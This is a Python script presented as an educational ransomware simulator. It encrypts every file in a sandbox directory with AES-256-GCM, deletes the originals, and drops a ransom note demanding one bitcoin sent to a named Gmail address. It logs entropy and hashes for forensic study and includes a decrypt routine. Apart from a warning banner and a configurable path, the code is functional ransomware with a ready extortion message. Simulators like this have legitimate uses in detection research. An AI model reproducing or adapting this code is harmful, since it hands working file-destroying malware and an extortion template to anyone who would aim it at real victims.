import os
import json
import time
import math
import hashlib
from datetime import datetime
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# --- WARNING: FOR EDUCATIONAL USE ONLY ---
print("====================================================")
print("⚠️  SIMULATOR ONLY — DO NOT RUN OUTSIDE VM ⚠️")
print("====================================================")

# Paths & Configuration
TARGET_DIR = "/sandbox/test_files/"
KEY_PATH = "/sandbox/secret.key"
LOG_PATH = "/sandbox/logs/behavior_log.json"

# Ransom Note Settings
RANSOM_NOTE_NAME = "RESTORE_FILES_INFO.txt"
RANSOM_NOTE_PATH = os.path.join(TARGET_DIR, RANSOM_NOTE_NAME)

def calculate_entropy(data):
    """Calculates Shannon Entropy to measure file randomness."""
    if not data: return 0
    entropy = 0
    for x in range(256):
        p_x = float(data.count(x)) / len(data)
        if p_x > 0:
            entropy += - p_x * math.log(p_x, 2)
    return entropy

def get_sha256(data):
    """Generates SHA-256 hash for data integrity verification."""
    return hashlib.sha256(data).hexdigest()

def log_behavior(event_type, file_info):
    """Logs forensic data into a JSON file for analysis."""
    log_entry = {
        "timestamp": datetime.now().isoformat(),
        "event": event_type,
        "details": file_info
    }
  
    os.makedirs(os.path.dirname(LOG_PATH), exist_ok=True)
    with open(LOG_PATH, "a") as f:
        f.write(json.dumps(log_entry) + "\n")

def get_key():
    """Generates or retrieves the 256-bit AES key."""
    if not os.path.exists(KEY_PATH):
        key = AESGCM.generate_key(bit_length=256)
        with open(KEY_PATH, "wb") as f: f.write(key)
        return key
    with open(KEY_PATH, "rb") as f: return f.read()

def encrypt_files():
    """Simulates a ransomware attack: Encrypt, Delete, and Leave Note."""
    aesgcm = AESGCM(get_key())
    
    # 1. Create the Ransom Note with the specific Email and BTC amount
    ransom_message = (
        "--- ALL YOUR IMPORTANT FILES ARE ENCRYPTED --- \n\n"
        "Your documents, photos, databases, and other important files have been \n"
        "encrypted using military-grade AES-256-GCM encryption.\n\n"
        "To decrypt your files and restore your data, you must pay: 1 BITCOIN (BTC).\n"
        "Please send the payment and your unique ID to the following email: \n"
        ">>> Cls.eventat@gmail.com <<<\n\n"
        "After payment is verified, you will receive the decryption tool.\n"
        "Do not attempt to modify encrypted files (.locked), as this will lead to \n"
        "permanent data loss."
    )
    with open(RANSOM_NOTE_PATH, "w", encoding="utf-8") as f:
        f.write(ransom_message)
    print(f"[!] Ransom note created: {RANSOM_NOTE_NAME}")

    # 2. Iterate and Encrypt files
    for filename in os.listdir(TARGET_DIR):
        # Avoid encrypting the note, the key, or already locked files
        if filename.endswith(".locked") or filename == "secret.key" or filename == RANSOM_NOTE_NAME:
            continue
            
        path = os.path.join(TARGET_DIR, filename)
        with open(path, "rb") as f: data = f.read()
        
        start_time = time.time()
        nonce = os.urandom(12) 
        encrypted_data = aesgcm.encrypt(nonce, data, None)
        
        # Write encrypted file
        with open(path + ".locked", "wb") as f: f.write(nonce + encrypted_data)
        
        # Forensic Logging
        log_behavior("ENCRYPTION", {
            "file": filename,
            "orig_sha256": get_sha256(data),
            "orig_entropy": calculate_entropy(data),
            "enc_entropy": calculate_entropy(encrypted_data),
            "duration": time.time() - start_time
        })
        
        # Remove original file
        os.remove(path)
        print(f"[+] Encrypted: {filename}")

def decrypt_files():
    """Simulates the recovery process and cleans up the ransom note."""
    aesgcm = AESGCM(get_key())
    files_decrypted = 0

    for filename in os.listdir(TARGET_DIR):
        if not filename.endswith(".locked"): continue
        
        path = os.path.join(TARGET_DIR, filename)
        with open(path, "rb") as f: 
            raw_data = f.read()
            nonce = raw_data[:12]
            encrypted_content = raw_data[12:]
        
        try:
            decrypted_data = aesgcm.decrypt(nonce, encrypted_content, None)
            original_path = path.replace(".locked", "")
            
            with open(original_path, "wb") as f: f.write(decrypted_data)
            
            log_behavior("DECRYPTION", {
                "file": original_path,
                "restored_sha256": get_sha256(decrypted_data)
            })
            os.remove(path)
            print(f"[-] Decrypted: {original_path}")
            files_decrypted += 1
        except Exception as e:
            print(f"[!] Decryption Error: {e}")

    # Cleanup: Remove the ransom note after successful restoration
    if files_decrypted > 0 and os.path.exists(RANSOM_NOTE_PATH):
        os.remove(RANSOM_NOTE_PATH)
        print(f"[!] Data Restored Successfully. Ransom note removed.")

if __name__ == "__main__":
    choice = input("Enter 'E' to Encrypt or 'D' to Decrypt: ").upper()
    if choice == 'E': 
        encrypt_files()
    elif choice == 'D': 
        decrypt_files()
    else: 
        print("Invalid Selection.")
